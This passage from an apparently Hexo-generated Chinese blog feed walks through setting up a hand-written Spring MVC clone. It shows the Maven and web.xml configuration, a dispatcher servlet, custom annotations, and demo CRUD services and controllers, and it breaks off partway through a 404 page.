class_">MyApplicationContextAware</span> &#123;    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApplicationContext</span><span class="hljs-params">(MyApplicationContext applicationContext)</span>;&#125;</code></pre></div></li></ul><h2 id="今日战况概览"><a href="#今日战况概览" class="headerlink" title="今日战况概览"></a>今日战况概览</h2><p><img src="https://img-blog.csdnimg.cn/d76336c4daa542098c2c46fff167b368.png" alt="请添加图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>手写spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>设计模式</title>
    <link href="/2022/08/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/08/14/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="设计模式（updating）"><a href="#设计模式（updating）" class="headerlink" title="设计模式（updating）"></a>设计模式（updating）</h1><p>[TOC]</p><h2 id="1-工厂模式"><a href="#1-工厂模式" class="headerlink" title="1.工厂模式"></a>1.工厂模式</h2><h2 id="2-单例模式"><a href="#2-单例模式" class="headerlink" title="2.单例模式"></a>2.单例模式</h2><h2 id="3-原型模式"><a href="#3-原型模式" class="headerlink" title="3.原型模式"></a>3.原型模式</h2><h2 id="4-代理模式"><a href="#4-代理模式" class="headerlink" title="4.代理模式"></a>4.代理模式</h2><h2 id="5-委派模式"><a href="#5-委派模式" class="headerlink" title="5. 委派模式"></a>5. 委派模式</h2><h2 id="6-策略模式"><a href="#6-策略模式" class="headerlink" title="6.策略模式"></a>6.策略模式</h2><h2 id="7-模版模式"><a href="#7-模版模式" class="headerlink" title="7.模版模式"></a>7.模版模式</h2><h2 id="8-适配器模式"><a href="#8-适配器模式" class="headerlink" title="8.适配器模式"></a>8.适配器模式</h2><h2 id="9-装饰者模式"><a href="#9-装饰者模式" class="headerlink" title="9.装饰者模式"></a>9.装饰者模式</h2><h2 id="10-观察者模式"><a href="#10-观察者模式" class="headerlink" title="10.观察者模式"></a>10.观察者模式</h2>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暑假最后几天！肝爆（手写）一个Spring之Day2</title>
    <link href="/2022/08/14/spring_day02/"/>
    <url>/2022/08/14/spring_day02/</url>
    
    <content type="html"><![CDATA[<h1 id="Day02—Spring开撸前之环境准备"><a href="#Day02—Spring开撸前之环境准备" class="headerlink" title="Day02—Spring开撸前之环境准备"></a>Day02—Spring开撸前之环境准备</h1><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><ul><li><p>一开始肯定多少是有点懵b的，但是咱冷静一下整理思路。。。</p></li><li><p>新建一个Maven web项目，不会看教程：<a href="http://t.csdn.cn/YugX1%EF%BC%8C%E5%90%8E%E9%9D%A2%E6%80%8E%E4%B9%88%E5%90%AF%E5%8A%A8%E5%B0%B1%E6%98%AF%E6%89%93war%E5%8C%85%E5%9C%A8tomcat%E4%B8%8A%E8%BF%90%E8%A1%8C">http://t.csdn.cn/YugX1，后面怎么启动就是打war包在tomcat上运行</a></p></li><li><p>用application.properties代替application.xml（网上常见做法）</p></li><li><p><img src="https://img-blog.csdnimg.cn/7de80e859c1e4b1aa177b9a737b4dfff.png" alt="请添加图片描述"></p></li><li><p>pom.xml配置</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.czh<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>luelueking_Spring_Source<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet.api.version</span>&gt;</span>2.4<span class="hljs-tag">&lt;/<span class="hljs-name">servlet.api.version</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;servlet.api.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.36<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ch.qos.logback<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>logback-classic<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre></div></li><li><p>配置web.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>luelueking Spring Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>mymvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.czh.spring.framework.webmvc.servlet.MyDispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:application.properties<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>mymvc<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span></code></pre></div></li><li><p>创建servlet作为MVC的入口</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc.servlet;<span class="hljs-keyword">import</span> javax.servlet.ServletConfig;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doGet(req, resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doPost(req, resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;        <span class="hljs-built_in">super</span>.init(config);    &#125;&#125;</code></pre></div></li><li><p>在来点注解（注意Target作用域）</p><p><img src="https://img-blog.csdnimg.cn/c9bd1fdd6f874383a92427b052f3f3ce.png" alt="请添加图片描述"></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.FIELD&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyAutowired &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyController &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.METHOD,ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyRequestMapping &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<span class="hljs-meta">@Target(ElementType.PARAMETER)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyRequestParam &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-type">boolean</span> <span class="hljs-title function_">required</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="hljs-meta">@Documented</span><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyService &#123;String <span class="hljs-title function_">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-string">&quot;&quot;</span>;&#125;</code></pre></div></li></ul><h2 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h2><ul><li><p>整个查询业务</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 查询业务</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">QueryService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 查询</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">query</span><span class="hljs-params">(String name)</span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service.impl;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.QueryService;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyService;<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<span class="hljs-keyword">import</span> java.util.Date;<span class="hljs-meta">@Slf4j</span><span class="hljs-meta">@MyService</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QueryServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">QueryService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 查询</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">query</span><span class="hljs-params">(String name)</span> &#123;        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> sdf.format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;name:\&quot;&quot;</span> + name + <span class="hljs-string">&quot;\&quot;,time:\&quot;&quot;</span> + time + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>;        log.info(<span class="hljs-string">&quot;这是在业务方法中打印的：&quot;</span> + json);        <span class="hljs-keyword">return</span> json;    &#125;&#125;</code></pre></div></li><li><p>CURD都补上</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service;<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ModifyService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 增加</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">add</span><span class="hljs-params">(String name, String addr)</span> <span class="hljs-keyword">throws</span> Exception;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 修改</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">edit</span><span class="hljs-params">(Integer id, String name)</span>;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 删除</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">remove</span><span class="hljs-params">(Integer id)</span>;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.service.impl;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.ModifyService;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModifyServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ModifyService</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 增加</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">add</span><span class="hljs-params">(String name, String addr)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService add,name=&quot;</span> + name + <span class="hljs-string">&quot;,addr=&quot;</span> + addr;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 修改</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">edit</span><span class="hljs-params">(Integer id, String name)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService edit,id=&quot;</span> + id + <span class="hljs-string">&quot;,name=&quot;</span> + name;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 删除</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">remove</span><span class="hljs-params">(Integer id)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;modifyService id=&quot;</span> + id;    &#125;&#125;</code></pre></div></li><li><p>整个Controller整合CRUD</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.controller;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.ModifyService;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.QueryService;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.*;<span class="hljs-keyword">import</span> com.czh.spring.framework.webmvc.MyModelAndView;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.util.Arrays;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 公布接口url</span><span class="hljs-comment"> *</span><span class="hljs-comment"> */</span><span class="hljs-meta">@MyController</span><span class="hljs-meta">@MyRequestMapping(&quot;/web&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CRUDController</span> &#123;<span class="hljs-meta">@MyAutowired</span>QueryService queryService;<span class="hljs-meta">@MyAutowired</span>ModifyService modifyService;<span class="hljs-meta">@MyRequestMapping(&quot;/query.json&quot;)</span><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">query</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response,</span><span class="hljs-params"><span class="hljs-meta">@MyRequestParam(&quot;name&quot;)</span> String name)</span>&#123;<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> queryService.query(name);<span class="hljs-keyword">return</span> out(response,result);&#125;<span class="hljs-meta">@MyRequestMapping(&quot;/add.json&quot;)</span><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">add</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response,</span><span class="hljs-params">   <span class="hljs-meta">@MyRequestParam(&quot;name&quot;)</span> String name,<span class="hljs-meta">@MyRequestParam(&quot;address&quot;)</span> String address)</span>&#123;<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;result = modifyService.add(name,address);<span class="hljs-keyword">return</span> out(response,result);&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-comment">//e.printStackTrace();</span>Map&lt;String,Object&gt; model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String,Object&gt;();model.put(<span class="hljs-string">&quot;detail&quot;</span>,e.getCause().getMessage());<span class="hljs-comment">//System.out.println(Arrays.toString(e.getStackTrace()).replaceAll(&quot;\\[|\\]&quot;,&quot;&quot;));</span>model.put(<span class="hljs-string">&quot;stackTrace&quot;</span>, Arrays.toString(e.getStackTrace()).replaceAll(<span class="hljs-string">&quot;\\[|\\]&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyModelAndView</span>(<span class="hljs-string">&quot;500&quot;</span>,model);&#125;&#125;<span class="hljs-meta">@MyRequestMapping(&quot;/remove.json&quot;)</span><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">remove</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response,</span><span class="hljs-params">   <span class="hljs-meta">@MyRequestParam(&quot;id&quot;)</span> Integer id)</span>&#123;<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> modifyService.remove(id);<span class="hljs-keyword">return</span> out(response,result);&#125;<span class="hljs-meta">@MyRequestMapping(&quot;/edit.json&quot;)</span><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">edit</span><span class="hljs-params">(HttpServletRequest request,HttpServletResponse response,</span><span class="hljs-params"><span class="hljs-meta">@MyRequestParam(&quot;id&quot;)</span> Integer id,</span><span class="hljs-params"><span class="hljs-meta">@MyRequestParam(&quot;name&quot;)</span> String name)</span>&#123;<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> modifyService.edit(id,name);<span class="hljs-keyword">return</span> out(response,result);&#125;<span class="hljs-keyword">private</span> MyModelAndView <span class="hljs-title function_">out</span><span class="hljs-params">(HttpServletResponse resp,String str)</span>&#123;<span class="hljs-keyword">try</span> &#123;resp.getWriter().write(str);&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;e.printStackTrace();&#125;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;&#125;</code></pre></div></li><li><p>整个pageController用来测试模版渲染</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.demo.controller;<span class="hljs-keyword">import</span> com.czh.spring.demo.service.QueryService;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyAutowired;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyController;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyRequestMapping;<span class="hljs-keyword">import</span> com.czh.spring.framework.annotation.MyRequestParam;<span class="hljs-keyword">import</span> com.czh.spring.framework.webmvc.MyModelAndView;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-meta">@MyController</span><span class="hljs-meta">@MyRequestMapping(&quot;/&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageController</span> &#123;    <span class="hljs-meta">@MyAutowired</span>    QueryService queryService;    <span class="hljs-meta">@MyRequestMapping(&quot;/first.html&quot;)</span>    <span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">query</span><span class="hljs-params">(<span class="hljs-meta">@MyRequestParam(&quot;name&quot;)</span> String name)</span> &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> queryService.query(name);        Map&lt;String, Object&gt; model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();        model.put(<span class="hljs-string">&quot;name&quot;</span>, name);        model.put(<span class="hljs-string">&quot;hobby&quot;</span>,<span class="hljs-string">&quot;吃屎&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyModelAndView</span>(<span class="hljs-string">&quot;first.html&quot;</span>, model);    &#125;&#125;</code></pre></div></li><li><p>概览</p><p><img src="https://img-blog.csdnimg.cn/0c4c6f4ba43d4f27a0faae18ffa0170c.png" alt="请添加图片描述"></p></li></ul><h2 id="layouts整合前端资源测试"><a href="#layouts整合前端资源测试" class="headerlink" title="layouts整合前端资源测试"></a>layouts整合前端资源测试</h2><ul><li><p>我用的比较骚的404.html</p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;*&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-status-bar-style&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;black&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-capable&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;format-detection&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;telephone=no&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/lib/layui/css/layui.css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span 